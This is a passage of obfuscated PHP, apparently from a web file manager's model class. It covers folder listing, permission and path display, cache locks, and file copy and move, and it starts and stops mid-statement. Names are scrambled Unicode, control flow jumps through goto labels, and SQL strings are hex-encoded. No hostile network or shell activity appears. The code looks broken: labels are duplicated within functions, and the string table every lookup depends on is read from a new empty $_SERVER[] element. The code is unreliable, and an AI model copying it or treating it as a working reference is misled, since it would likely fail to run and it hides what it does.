$eӊ[$e[188]] = intval($aŶ[$eӊ[$e[365]] . $e[447]][$e[448]]); $eӊ[$e[187]] = intval($aŶ[$eӊ[$e[365]] . $e[449]][$e[448]]); } } goto E˂; dƭ: $e = $this->tablePrefix . $this->tableName; for ($dⱥ = 0; $dⱥ < $Eښё; $dⱥ++) { $BÎ = intval($F˝Ș[$dⱥ][$e[393]]); if ($F˝Ș[$dⱥ][$e[366]]) { $C = $F˝Ș[$dⱥ][$e[365]]; $dպ .= "\123\105\114\105\x43\x54\x20\x2a\x20\106\x52\117\115\40\x28\123\x45\114\x45\x43\x54\40\x27{$C}\137\150\x61\163\106\x69\154\x65\x27\x20\141\163\40\x68\141\163\54\143\157\165\156\x74\50\x31\x29\40\141\163\x20\x68\141\x73\103\157\x75\x6e\164\x20\x46\x52\117\115\x20\x60{$e}\140\x20\12\x9\x9\x9\x9\x9\x77\150\x65\162\145\x20\x70\x61\x72\145\156\164\x49\104\75{$C}\x20\x61\x6e\x64\x20\x69\163\106\x6f\x6c\144\145\162\75\60\x20\141\156\x64\40\151\163\x44\145\154\x65\164\x65\75{$BÎ}\51\40\141\x73\40\x74\x62\x31\137{$C}\x20\x75\x6e\x69\x6f\x6e\x20\141\x6c\x6c\40\xa\x9\x9\x9\11\x9\123\x45\x4c\105\x43\124\40\52\40\106\122\117\115\40\x28\x53\105\x4c\105\x43\x54\x20\47{$C}\137\150\141\x73\x46\x6f\154\144\x65\162\47\40\141\x73\x20\x68\141\163\x46\x69\x6c\x65\x2c\x63\x6f\165\x6e\x74\x28\x31\51\40\x61\163\x20\150\141\x73\103\x6f\x75\x6e\x74\40\x46\122\x4f\x4d\40\x60{$e}\x60\40\12\11\11\x9\x9\11\x77\x68\145\x72\x65\40\160\x61\162\x65\156\x74\111\104\x3d{$C}\x20\x61\x6e\144\40\151\163\106\157\154\x64\x65\162\x3d\x31\40\x61\x6e\144\40\151\x73\x44\x65\154\x65\x74\x65\75{$BÎ}\51\x20\x61\x73\x20\x74\142\62\x5f{$C}\x20\165\x6e\151\x6f\156\40\141\154\154\x20"; } if ((strlen($dպ) >= $f뜄 || $dⱥ == $Eښё - 1) && $dպ) { $dպ = substr($dպ, 0, -strlen($e[445])); $eУ = $this->query($dպ); $aŶ = array_merge($aŶ, $eУ); $dպ = $e[33]; } } $aŶ = array_to_keyvalue($aŶ, $e[446]); goto F־Ħ; E˂: } protected function _listAppendAuth(&$Bټ) { goto f⹩; DП: foreach ($Bټ as $b) { if ($b[$b􅿆[367]] == self::TYPE_GROUP) { $d[] = $b[$b􅿆[365]]; } } if (!$d) { return; } $aК = array_to_keyvalue($Bټ, $b􅿆[365]); goto cή; f⹩: $b􅿆 =& $_SERVER[]; if (!defined($b􅿆[423])) { return; } $d = array(); goto DП; cή: $bư = Model($b􅿆[450])->getSourceList($d, $aК); foreach ($Bټ as $a => &$b) { $b[$b􅿆[372]] = $bư[$b[$b􅿆[365]]]; if (!$b[$b􅿆[372]] && $b[$b􅿆[367]] == self::TYPE_GROUP) { $b[$b􅿆[372]] = Action($b􅿆[451])->pathGroupAuthMake($b[$b􅿆[452]]); if (!$b[$b􅿆[372]] && !_get($GLOBALS, $b􅿆[453])) { $b[$b􅿆[185]] = !1; $b[$b􅿆[184]] = !1; } } if ($b[$b􅿆[372]]) { $b[$b􅿆[185]] = AuthModel::authCheckEdit($b[$b􅿆[372]][$b􅿆[373]]); $b[$b􅿆[184]] = AuthModel::authCheckView($b[$b􅿆[372]][$b􅿆[373]]); } $this->groupPathDisplay($b); } goto c׼; c׼: } public function groupPathDisplay(&$D) { goto c̆; d֚: $D[$bɰ˽[456]] = $F▉郺[$bɰ˽[457]]; $D[$bɰ˽[376]] = $F▉郺[$bɰ˽[455]]; $D[$bɰ˽[458]] = $F▉郺[$bɰ˽[459]]; goto DÃƧč; c̆: $bɰ˽ =& $_SERVER[]; if ($D[$bɰ˽[367]] != self::TYPE_GROUP) { return; } $F▉郺 = Model($bɰ˽[454])->getInfo($D[$bɰ˽[452]]); goto F; DÃƧč: $D[$bɰ˽[460]] = $f . $F▉郺[$bɰ˽[387]][$bɰ˽[365]]; goto dŏ; F: $AҰ = $this->parentLevelArray($F▉郺[$bɰ˽[455]]); $f = $bɰ˽[33]; foreach ($AҰ as $BƉˑ) { $F = Model($bɰ˽[454])->getInfo($BƉˑ); $f .= $F[$bɰ˽[387]][$bɰ˽[365]] . $bɰ˽[47]; } goto d֚; dŏ: } protected function _listAppendPath(&$fߍ) { goto B濅; a: $b̔ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($fߍ as &$AÊƾ) { goto ǎش; Aȏ: $A֛ۣ = trim($AÊƾ[$C걣ʝ[462]], $C걣ʝ[8]); if ($AÊƾ[$C걣ʝ[457]] == $C걣ʝ[464] && $A֛ۣ) { $AÊƾ[$C걣ʝ[28]] = $A֛ۣ; } $this->_listAppendPathRecycle($AÊƾ, $fÈٟ, $b̔); goto eֆ; ǎش: $fÈٟ = $this->parentLevelArray($AÊƾ[$C걣ʝ[455]]); $b = $this->_listAppendPathRoot($AÊƾ, $fÈٟ); foreach ($fÈٟ as $bѨ) { if (isset($C㠐[$bѨ])) { $b .= $C㠐[$bѨ] . $C걣ʝ[8]; } } goto C; C: if ($fÈٟ) { $b .= $AÊƾ[$C걣ʝ[28]]; } if ($AÊƾ[$C걣ʝ[366]]) { $b .= $C걣ʝ[8]; } $AÊƾ[$C걣ʝ[462]] = str_replace($C걣ʝ[463], $C걣ʝ[8], $b); goto Aȏ; eֆ: } goto CȻ; Aɺ: $d = array(); foreach ($C㠐 as $bǵ => $a߈) { if (!$a߈) { $d[] = $bǵ; } } if ($d) { $B = array($C걣ʝ[379] => array($C걣ʝ[380], $d)); if (count($d) == 1) { $a匶 = $this->sourceInfo($d[0]); $a匶 = is_array($a匶) ? array($a匶) : !1; } else { $a匶 = $this->field($C걣ʝ[461])->where($B)->select(); } $fɑ = array_to_keyvalue($a匶, $C걣ʝ[365], $C걣ʝ[28]); $C㠐 = array_merge_index($C㠐, $fɑ); } goto a; B濅: $C걣ʝ =& $_SERVER[]; $C㠐 = array(); foreach ($fߍ as &$AÊƾ) { $C㠐[$AÊƾ[$C걣ʝ[365]]] = $AÊƾ[$C걣ʝ[28]]; $fÈٟ = $this->parentLevelArray($AÊƾ[$C걣ʝ[455]]); array_shift($fÈٟ); foreach ($fÈٟ as $bѨ) { if (!isset($C㠐[$bѨ])) { $C㠐[$bѨ] = 0; } } } goto Aɺ; CȻ: } private function _listAppendPathRecycle(&$Eł, $CΝ, $dĲ߄֋) { goto CҖ; f͙: $cЯ = explode($eÉ[8], trim($Eł[$eÉ[462]], $eÉ[8])); $e˃ = implode($eÉ[8], array_slice($cЯ, 2)); $Eł[$eÉ[462]] = $eÉ[8] . LNG($eÉ[465]) . $eÉ[8] . ltrim($e˃, $eÉ[8]); goto d; d: $Eł[$eÉ[455]] = $eÉ[466] . implode($eÉ[47], array_slice($CΝ, 1)) . $eÉ[47]; if ($Eł[$eÉ[365]] == $dĲ߄֋) { $Eł[$eÉ[455]] = $eÉ[466]; $Eł[$eÉ[457]] = $eÉ[464]; $Eł[$eÉ[28]] = LNG($eÉ[465]); } $Eł[$eÉ[467]] = $eÉ[468]; goto d; CҖ: $eÉ =& $_SERVER[]; if (intval($Eł[$eÉ[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($dĲ߄֋, $CΝ) && $Eł[$eÉ[365]] != $dĲ߄֋) { return; } goto f͙; d: } protected function _listAppendPathRoot(&$dތϒ, $C˟) { $e =& $_SERVER[]; $Bϐ晩 = $e[33]; if ($dތϒ[$e[367]] == self::TYPE_USER) { if (defined($e[423]) && $dތϒ[$e[452]] == USER_ID) { $Bϐ晩 = LNG($e[469]); if (!$C˟) { $dތϒ[$e[28]] = $Bϐ晩; } } else { $BǬ = Model($e[470])->getInfoSimple($dތϒ[$e[452]]); $Bϐ晩 = LNG($e[471]) . $e[153] . $BǬ[$e[28]] . $e[472]; } } else { if ($dތϒ[$e[367]] == self::TYPE_GROUP) { $BǬ = Model($e[454])->getInfoSimple($dތϒ[$e[452]]); $Bϐ晩 = $BǬ[$e[28]]; } else { if ($dތϒ[$e[367]] == self::TYPE_SYSTEM) { $BǬ = $this->sourceInfo($C˟[0], !0); $Bϐ晩 = $BǬ[$e[28]]; } } } $Bϐ晩 = $Bϐ晩 ? $e[8] . $Bϐ晩 . $e[8] : $e[8]; return $Bϐ晩; } protected function _listAppendUser(&$c) { $eДݣы =& $_SERVER[]; $dѺ = array_to_keyvalue($c, $eДݣы[33], $eДݣы[374]); $d鱇 = array_to_keyvalue($c, $eДݣы[33], $eДݣы[375]); $Dȋ = array_merge($dѺ, $d鱇); $f = Model($eДݣы[473])->userListInfo($Dȋ); foreach ($c as &$Dݩ⶛) { $d = $Dݩ⶛[$eДݣы[374]]; $Dݩ⶛[$eДݣы[374]] = $f[$d] ? $f[$d] : !1; $d = $Dݩ⶛[$eДݣы[375]]; $Dݩ⶛[$eДݣы[375]] = $f[$d] ? $f[$d] : !1; if (isset($Dݩ⶛[$eДݣы[413]]) && $Dݩ⶛[$eДݣы[413]][$eДݣы[474]]) { $bՠϩ = $GLOBALS[$eДݣы[6]][$eДݣы[84]][$eДݣы[475]]; if ($Dݩ⶛[$eДݣы[413]][$eДݣы[476]] <= time() - $bՠϩ) { $this->metaSet($Dݩ⶛[$eДݣы[365]], $eДݣы[474], null); $this->metaSet($Dݩ⶛[$eДݣы[365]], $eДݣы[476], null); unset($Dݩ⶛[$eДݣы[413]][$eДݣы[474]]); continue; } $b߂ = $Dݩ⶛[$eДݣы[413]][$eДݣы[474]]; $Dݩ⶛[$eДݣы[413]][$eДݣы[477]] = Model($eДݣы[473])->getInfoSimpleOuter($b߂); } } } public function parentLevelArray($d) { $bʠ焌 =& $_SERVER[]; $d = explode($bʠ焌[47], trim($d, $bʠ焌[47])); return array_remove_value($d, $bʠ焌[464]); } public function listAll($Eכ) { goto A󙥥; Cң: $Aۗ = array_to_keyvalue($Aۗ, $c巍[365]); $e˵ = "\x2f{$bϙ[$c巍[28]]}\x2f"; $e˵ = $e˵ == $c巍[463] ? $c巍[8] : $e˵; goto fĆ; d: $Cܳ = $c巍[482]; $D咝 = "\114\x45\x46\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\x66\151\154\145\x20\x66\x69\154\x65\x20\x6f\x6e\x20\x73\x6f\x75\162\143\145\x2e\x66\x69\x6c\145\111\104\40\x3d\x20\146\151\x6c\x65\x2e\x66\151\x6c\x65\x49\104"; $Aۗ = $this->alias($c巍[483])->field($Cܳ)->where($eن)->join($D咝)->select(); goto f; A󙥥: $c巍 =& $_SERVER[]; $bϙ = $this->sourceInfo($Eכ); $eن = array($c巍[478] => array($c巍[479], $bϙ[$c巍[455]] . $Eכ . $c巍[480]), $c巍[481] => 0); goto d; fĆ: $ȇ = array(); foreach ($Aۗ as $aǈ => $c䘦) { goto B⑂Ȃ; B⑂Ȃ: $DƏ = $this->parentLevelArray($c䘦[$c巍[455]]); array_shift($DƏ); $B = $e˵; goto AݗԲߍ; dٝؔ: if (!$c䘦[$c巍[366]]) { $C؛̌[$c巍[415]] = $c䘦[$c巍[415]]; $C؛̌[$c巍[485]] = $c䘦[$c巍[75]]; } $ȇ[] = $C؛̌; goto f; aِ: $B = str_replace($c巍[463], $c巍[8], $B); $B = str_replace($c巍[463], $c巍[8], $B); $C؛̌ = array($c巍[383] => str_replace($c巍[463], $c巍[8], $B), $c巍[484] => intval($c䘦[$c巍[366]]), $c巍[387] => $this->pathInfoFilter($c䘦, !0)); goto dٝؔ; AݗԲߍ: for ($F七 = 0; $F七 < count($DƏ); $F七++) { $B .= $Aۗ[$DƏ[$F七]][$c巍[28]] . $c巍[8]; } $B .= $c䘦[$c巍[28]]; if ($c䘦[$c巍[366]]) { $B .= $c巍[8]; } goto aِ; f: } return $ȇ; goto a; f: $this->_listAppendAuth($Aۗ); $this->_listAppendUser($Aۗ); $this->_listAppendPath($Aۗ); goto Cң; a: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Bޯɟ) { goto C蚆; Bχ: $fˣϭ = 1; $this->_lockEvent($Bޯɟ, array($Fᰍޔ[487], $Fᰍޔ[488]), $fˣϭ); $this->_lockParent($Bޯɟ, array($Fᰍޔ[488]), $fˣϭ); goto cڠ; cڠ: $this->_lockEvent($Bޯɟ, array($Fᰍޔ[489], $Fᰍޔ[490]), $fˣϭ); $this->_lockCheckEnd($Fᰍޔ[486], $Bޯɟ); goto a㈗; C蚆: $Fᰍޔ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Fᰍޔ[486], $Bޯɟ); goto Bχ; a㈗: } public function lockCopyEnd($e) { $B =& $_SERVER[]; if (!$this->allowLock()) { return; } $aǈ = 0; $this->_lockEvent($e, array($B[487], $B[488]), $aǈ); $this->_lockParent($e, array($B[488]), $aǈ); $this->_lockEvent($e, array($B[489], $B[490]), $aǈ); } public function lockWriteStart($D, $e˛ܱ = '') { goto bӰ; cʎ: $Cٰ͌ = 1; $this->_lockKey($ā߹[491] . $D . $ā߹[91] . $e˛ܱ, $Cٰ͌); $this->_lockEvent($D, array($ā߹[486], $ā߹[488]), $Cٰ͌); goto A; bӰ: $ā߹ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($ā߹[487], $D); goto cʎ; A: $this->_lockParent($D, array($ā߹[486], $ā߹[488]), $Cٰ͌); $this->_lockCheckEnd($ā߹[487], $D); goto b̈Щ; b̈Щ: } public function lockWriteEnd($F׻, $A܍ = '') { $A =& $_SERVER[]; if (!$this->allowLock()) { return; } $Aܼ߱ = 0; $this->_lockKey($A[491] . $F׻ . $A[91] . $A܍, $Aܼ߱); $this->_lockEvent($F׻, array($A[486], $A[488]), $Aܼ߱); $this->_lockParent($F׻, array($A[486], $A[488]), $Aܼ߱); } public function lockMoveStart($cЌҴ) { goto aݻ; eн: $f = 1; $this->_lockKey($Cѻ[492] . $cЌҴ, $f); $this->_lockEvent($cЌҴ, array($Cѻ[486], $Cѻ[487]), $f); goto Fւş; aݻ: $Cѻ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Cѻ[488], $cЌҴ); goto eн; Fւş: $this->_lockParent($cЌҴ, array($Cѻ[486], $Cѻ[488]), $f); $this->_lockEvent($cЌҴ, array($Cѻ[493], $Cѻ[489], $Cѻ[490]), $f); $this->_lockCheckEnd($Cѻ[488], $cЌҴ); goto Dġǲ; Dġǲ: } public function lockMoveEnd($A˙) { goto cܧ; cܧ: $bʿ =& $_SERVER[]; if (!$this->allowLock()) { return; } $D͡۵ڹ = 0; goto A; Bҩ܄: $this->_lockEvent($A˙, array($bʿ[493], $bʿ[489], $bʿ[490]), $D͡۵ڹ); goto c; A: $this->_lockKey($bʿ[492] . $A˙, $D͡۵ڹ); $this->_lockEvent($A˙, array($bʿ[486], $bʿ[487]), $D͡۵ڹ); $this->_lockParent($A˙, array($bʿ[486], $bʿ[488]), $D͡۵ڹ); goto Bҩ܄; c: } private function _lockCheck($B, $E) { goto fѷ; d脐: CacheLock::setErrorMsg($A[153] . htmlspecialchars($Cꉰ[$A[28]]) . $A[472] . $e㍇); $this->_lockKey($aʔۯ, 1); $this->_lockKey($aʔۯ, 0); goto eΎ; eΎ: $fꇳ܍ = array_reverse($this->parentLevelArray($Cꉰ[$A[455]])); foreach ($fꇳ܍ as $cĽ) { $aʔۯ = $B . $A[495] . $cĽ; if (CacheLock::lockGet($A[496] . $aʔۯ)) { $Cꉰ = $this->sourceInfo($cĽ); CacheLock::setErrorMsg($A[153] . htmlspecialchars($Cꉰ[$A[28]]) . $A[472] . $e㍇); $this->_lockKey($aʔۯ, 1); $this->_lockKey($aʔۯ, 0); } } goto cצ; fѷ: $A =& $_SERVER[]; $Cꉰ = $this->sourceInfo($E); $aʔۯ = $B . $A[91] . $E; goto Bƕ; Bƕ: $this->_lockTimeStart[$aʔۯ] = timeFloat(); if (!is_array($Cꉰ)) { return; } $e㍇ = LNG($A[494]); goto d脐; cצ: } private function _lockCheckEnd($c҅, $a񃎃ǳ) { goto AĿ嬉; Bݐ: if (!isset($this->_lockTimeStart[$BԮ])) { return; } $c߉⣹ = timeFloat() - $this->_lockTimeStart[$BԮ]; unset($this->_lockTimeStart[$BԮ]); goto F݅; AĿ嬉: $Fύ =& $_SERVER[]; $BԮ = $c҅ . $Fύ[91] . $a񃎃ǳ; CacheLock::setErrorMsg($Fύ[357]); goto Bݐ; F݅: if ($c߉⣹ > 0.5) { unset(self::$cacheSourceInfo[$Fύ[406] . $a񃎃ǳ]); } $eѾ = $this->sourceInfo($a񃎃ǳ); if (!$eѾ) { show_json(LNG($Fύ[100]), !1); } goto f貅; f貅: } private function _lockParent($D᪑, $A҈, $BӘ) { if (!$this->autoLockSet) { return; } $Dİ = $this->sourceInfo($D᪑); if (!is_array($Dİ)) { return; } $cҲ׭ = array_reverse($this->parentLevelArray($Dİ[$_SERVER[][455]])); foreach ($cҲ׭ as $BՍ) { $this->_lockEvent($BՍ, $A҈, $BӘ); } } private function _lockEvent($e܏, $Eڤ, $C􊲫) { $DƦץ׮ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($Eڤ as $aѺ) { $A鴱 = $aѺ . $DƦץ׮[91] . $e܏; if ($C􊲫 && CacheLock::lockGet($DƦץ׮[496] . $A鴱)) { continue; } $this->_lockKey($A鴱, $C􊲫); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Dؐ, $C = 1) { $BĊʿ = $_SERVER[][496] . md5($Dؐ); if ($C) { if (isset(self::$_lockItemArr[$BĊʿ])) { return; } self::$_lockItemArr[$BĊʿ] = 1; CacheLock::lock($BĊʿ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$BĊʿ])) { return; } unset(self::$_lockItemArr[$BĊʿ]); CacheLock::unlock($BĊʿ); } } public function isParentOf($DԎ, $D႙) { goto A; A: $FǶ =& $_SERVER[]; $dʘ = $this->sourceInfo($DԎ); $Eչ섬 = $this->sourceInfo($D႙); goto Dúް; Dúް: $fČ = $dʘ[$FǶ[455]] . $dʘ[$FǶ[365]] . $FǶ[47]; $Cς = $Eչ섬[$FǶ[455]] . $Eչ섬[$FǶ[365]] . $FǶ[47]; $cɏ = strpos($Cς, $fČ) === 0; goto cП̝; cП̝: return $cɏ; goto bŞ; bŞ: } private $targetIsDelete = 0; public function copy($E, $D㐆, $D = REPEAT_REPLACE, $EٺŌ = '') { goto fΏͰ; A: if ($f޿ȑ[$a۪[366]] == $a۪[83] && $eװ == $CٓՑ) { $this->folderSizeResetChildren($eװ); } Model($a۪[500])->addAll($E[$a۪[498]], array(), !0); if ($eװ != $CٓՑ || $f޿ȑ[$a۪[366]] == $a۪[83]) { Model($a۪[501])->eventCopy($CٓՑ); } goto b΋; b΋: $this->saveAll($E[$a۪[499]]); Model($a۪[163])->linkAdd($E[$a۪[497]]); $this->folderSizeReset($D㐆); goto CԆ; f˝: $this->_childrenListClear(); $this->lockCopyEnd($E); $this->lockWriteEnd($D㐆, $bѭ); goto A; b: $this->lockCopyStart($E); $this->lockWriteStart($D㐆, $bѭ); $E = array($a۪[497] => array(), $a۪[498] => array(), $a۪[499] => array()); goto b⦨҅; fΏͰ: $a۪ =& $_SERVER[]; $f޿ȑ = $this->sourceInfo($E); $EЏ = $this->sourceInfo($D㐆); goto C; b⦨҅: $this->targetIsDelete = intval($f޿ȑ[$a۪[393]]); $eװ = $this->fileNameExistCache($D㐆, $f޿ȑ[$a۪[28]]); $CٓՑ = $this->_copy($E, $D㐆, $D, $E, !0, $EٺŌ); goto f˝; C: if (!$f޿ȑ || !$EЏ || $EЏ[$a۪[366]] != $a۪[83]) { return !1; } if ($this->isParentOf($E, $D㐆)) { return !1; } $bѭ = $EٺŌ ? $EٺŌ : $f޿ȑ[$a۪[28]]; goto b; CԆ: $this->updateModifyTime($D㐆); return $CٓՑ; goto dů; dů: } private function _copy($CՉ, $F, $dئ, &$eڨ˳, $e̜, $BԿ = '') { goto b妉; aỜ: if (!$B֦) { return $this->_copyCreate($CՉ, $F, $d, $eڨ˳); } $e۽ = $B֦; if ($E) { if ($dئ == REPEAT_RENAME_FOLDER) { $d = $this->fileNameAutoCache($F, $d, $dئ, $E); $e۽ = $this->_copyCreate($CՉ, $F, $d, $eڨ˳); } else { $E܇ = $this->_childrenList($CՉ); foreach ($E܇ as $Eɡ) { $this->_copy($Eɡ[$E[365]], $B֦, $dئ, $eڨ˳, !1); } } } else { if ($dئ == REPEAT_RENAME || $dئ == REPEAT_RENAME_FOLDER) { $d = $this->fileNameAutoCache($F, $d, $dئ, $E); $e۽ = $this->_copyCreate($CՉ, $F, $d, $eڨ˳); } else { if ($dئ == REPEAT_REPLACE) { $c冠 = $this->sourceInfoCache($B֦); $b螑ҥ = $this->fileHistory($c冠, $bņް[$E[415]], $bņް[$E[77]]); if ($b螑ҥ) { $eڨ˳[$E[497]][] = $bņް[$E[415]]; } } else { if ($dئ == REPEAT_SKIP) { } } } Hook::trigger($E[502], array($E[503], $bņް, 0)); } goto DȈ; b妉: $E =& $_SERVER[]; $bņް = $this->sourceInfoCache($CՉ); $E = $bņް[$E[366]] == $E[83]; goto C͗߸; DȈ: return $e۽; goto E˽Ү; C͗߸: $d = $BԿ ? $BԿ : $bņް[$E[28]]; $B֦ = $this->fileNameExistCache($F, $d); if ($e̜) { $this->_childrenAllMake($CՉ); if ($E && $B֦) { $this->_childrenAllMake($B֦); } } goto aỜ; E˽Ү: } private function _copyCreate($D, $EÚ, $a񏷨, &$eǧ) { goto B䔡; aȃ: $this->addAll($E, array(), !1); $Dɑɨѧ = $this->where(array($b僇[457] => $b͏ɹ))->select(); $FƮ = $this->_childrenMakeRelation($F뎜, $Dɑɨѧ); goto f; f: $FƮ[$D] = $b͏ɹ; $F = array(); $B׸ = array(); goto fϚ; bۉ: $this->_childrenListAll($D, $F뎜); $a = count($F뎜); if ($a == 0) { return $b͏ɹ; } goto e; Bړ: $b͏ɹ = $this->add($dᆋ); $aӱن = array($b僇[365] => $b͏ɹ, $b僇[28] => $a񏷨); $this->_copyApplyMeta($aӱن, $eǧ); goto dÏ; dꊜ: $dᆋ = $this->_makeItemData($AŎ, $b۵, $a񏷨); Hook::trigger($b僇[504], $dᆋ); Hook::trigger($b僇[505], array($b僇[506], $dᆋ, 0)); goto Bړ; fϚ: foreach ($Dɑɨѧ as $Fǭ۵) { $c֊ = $Fǭ۵[$b僇[365]]; $C = $this->_childrenMatch($FƮ, $Fǭ۵, $fյ); $F[] = array($b僇[365], $c֊, $b僇[457], $C[$b僇[457]]); $B׸[] = array($b僇[365], $c֊, $b僇[455], $C[$b僇[455]]); $this->_copyApplyMeta($Fǭ۵, $eǧ); if ($Fǭ۵[$b僇[366]] != $b僇[83]) { $eǧ[$b僇[497]][] = $Fǭ۵[$b僇[415]]; } } $this->chunkEventSet($b僇[509], array($b僇[510], $dᆋ, $a)); $this->saveAll($F); goto cԝդ; cԝդ: $this->chunkEventSet($b僇[511], array($b僇[512], $dᆋ, $a)); $this->saveAll($B׸); return $b͏ɹ; goto b҈; e: $fյ = $this->sourceInfo($b͏ɹ); foreach ($F뎜 as $Fǭ۵) { $D = $this->_makeItemData($Fǭ۵, $fյ, $Fǭ۵[$b僇[28]]); $D[$b僇[455]] = $Fǭ۵[$b僇[455]]; $E[] = $D; } $this->chunkEventSet($b僇[507], array($b僇[508], $dᆋ, $a)); goto aȃ; B䔡: $b僇 =& $_SERVER[]; $AŎ = $this->sourceInfoCache($D); $b۵ = $this->sourceInfoCache($EÚ); goto dꊜ; dÏ: if ($AŎ[$b僇[366]] != $b僇[83]) { $eǧ[$b僇[497]][] = $AŎ[$b僇[415]]; return $b͏ɹ; } $F뎜 = array(); $E = array(); goto bۉ; b҈: } private function _childrenMakeRelation($F, $CꄈΗ) { $Cیִ٣ =& $_SERVER[]; $eĲ = array(); $EޱǨ = array(); foreach ($F as $e) { $CХ = $e[$Cیִ٣[28]] . $Cیִ٣[8] . $e[$Cیִ٣[455]]; $eĲ[$CХ] = $e[$Cیִ٣[365]]; } foreach ($CꄈΗ as $e) { $CХ = $e[$Cیִ٣[28]] . $Cیִ٣[8] . $e[$Cیִ٣[455]]; $a = $eĲ[$CХ]; $EޱǨ[$a] = $e[$Cیִ٣[365]]; } return $EޱǨ; } private function _childrenMatch($e, $F눐, $B) { goto e뉡; å: foreach ($b as $a⧢) { if (isset($e[$a⧢])) { $CċĴ .= $e[$a⧢] . $B[513]; } } $CċĴ = rtrim($CċĴ, $B[47]) . $B[47]; $a߽ = $this->parentLevelArray($CċĴ); goto BЈ; e뉡: $B =& $_SERVER[]; $CċĴ = $B[$B[455]]; $b = $this->parentLevelArray($F눐[$B[455]]); goto å; BЈ: $c = $a߽[count($a߽) - 1]; return array($B[457] => $c, $B[455] => $CċĴ); goto bĨٺ; bĨٺ: } private function _makeItemData($d񐋰, $cә, $C) { $fӇˍ =& $_SERVER[]; $EɌ܌ = array($fӇˍ[514] => $d񐋰[$fӇˍ[366]], $fӇˍ[382] => $C, $fӇˍ[515] => $d񐋰[$fӇˍ[368]], $fӇˍ[416] => $d񐋰[$fӇˍ[415]], $fӇˍ[516] => $d񐋰[$fӇˍ[77]], $fӇˍ[517] => $cә[$fӇˍ[367]], $fӇˍ[518] => $cә[$fӇˍ[452]], $fӇˍ[519] => USER_ID, $fӇˍ[520] => USER_ID, $fӇˍ[364] => $cә[$fӇˍ[365]], $fӇˍ[521] => $cә[$fӇˍ[455]] . $cә[$fӇˍ[365]] . $fӇˍ[47], $fӇˍ[392] => 0, $fӇˍ[522] => $fӇˍ[33]); return $EɌ܌; } private function _copyApplyMeta($f𴖐, &$Eڝ) { $Aɻ =& $_SERVER[]; $e⢏ = $f𴖐[$Aɻ[365]]; $e飐 = $f𴖐[$Aɻ[28]]; if (!isset($f𴖐[$Aɻ[523]]) || !$f𴖐[$Aɻ[523]] || $f𴖐[$Aɻ[523]] == $Aɻ[464]) { $Eڝ[$Aɻ[499]][] = array($Aɻ[365], $e⢏, $Aɻ[523], short_id($e⢏)); } if (Input::check($e飐, $Aɻ[524])) { $Eڝ[$Aɻ[498]][] = array($Aɻ[365] => $e⢏, $Aɻ[89] => $Aɻ[412], $Aɻ[355] => str_replace($Aɻ[50], $Aɻ[33], Pinyin::encode($e飐))); $Eڝ[$Aɻ[498]][] = array($Aɻ[365] => $e⢏, $Aɻ[89] => $Aɻ[411], $Aɻ[355] => Pinyin::encode($e飐, $Aɻ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A쉛똅) { goto FɌ; FɌ: $Bի =& $_SERVER[]; $c = $this->sourceInfo($A쉛똅); $EȬ = $Bի[526]; goto e̺; f𺋏: $EɈ܆ = array_to_keyvalue($EɈ܆, $Bի[365]); foreach ($EɈ܆ as $d׹毎) { $f = $d׹毎[$Bի[457]]; $A쉛똅 = $d׹毎[$Bի[365]]; if (!isset($this->_childrenListCache[$A쉛똅]) && $d׹毎[$Bի[366]] == $Bի[83]) { $this->_childrenListCache[$A쉛똅] = array(); } if (!isset($this->_childrenListCache[$f])) { $this->_childrenListCache[$f] = array(); } $this->_childrenListCache[$f][$A쉛똅] = $d׹毎; $this->_childrenItemCache[$A쉛똅] = $d׹毎; } goto E̺̿; e̺: $B׉ = array($Bի[455] => array($Bի[479], $c[$Bի[455]] . $A쉛똅 . $Bի[480]), $Bի[393] => $this->targetIsDelete); $EɈ܆ = $this->field($EȬ)->where($B׉)->select(); if (!$EɈ܆) { return; } goto f𺋏; E̺̿: } private function _childrenListAll($BӉ҄, &$F) { $D =& $_SERVER[]; if (!isset($this->_childrenListCache[$BӉ҄])) { return; } $fȌ = $this->_childrenListCache[$BӉ҄]; foreach ($fȌ as $B؎ => $d῅) { $F[$B؎] = $d῅; if ($d῅[$D[366]] == $D[83]) { $this->_childrenListAll($B؎, $F); } } } private function sourceInfoCache($F) { if (isset($this->_childrenItemCache[$F])) { return $this->_childrenItemCache[$F]; } return $this->sourceInfo($F); } private function _childrenList($dضö) { if (isset($this->_childrenListCache[$dضö])) { return $this->_childrenListCache[$dضö]; } return $this->_childrenListSelect($dضö); } private function _childrenListSelect($B) { goto fĽ; C: foreach ($b폫 as $B => $eʌڄ) { $this->_childrenItemCache[$B] = $eʌڄ; } return $b폫; goto B鞏ʧ; cƢ: $fí = $fí ? $fí : array(); $b폫 = array_to_keyvalue($fí, $EÓ[365]); $this->_childrenListCache[$B] = $b폫; goto C; fĽ: $EÓ =& $_SERVER[]; $a = array($EÓ[457] => $B, $EÓ[393] => $this->targetIsDelete); $fí = $this->where($a)->select(); goto cƢ; B鞏ʧ: } private function fileNameExistCache($F拋Ҩ, $d) { $f =& $_SERVER[]; $d = strtolower($d); $Fڼ = $this->_childrenList($F拋Ҩ); foreach ($Fڼ as $f쪽) { if ($d == strtolower($f쪽[$f[28]])) { return $f쪽[$f[365]]; } } return !1; } private function fileNameAutoCache($D, $a厇, $E, $cʡ) { $eׄ =& $_SERVER[]; $Fݠ = $this->_childrenList($D); $aˋ = array_to_keyvalue($Fݠ, $eׄ[33], $eׄ[28]); return $this->fileNameAutoGet($aˋ, $a厇, $E, $cʡ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($B律, $C೪, $Bӏ = REPEAT_REPLACE, $b = '') { goto f; f: $dȺ = array($Dճ[497] => array(), $Dճ[529] => !1); $this->clearShare($B律, $C೪); $dӝ = 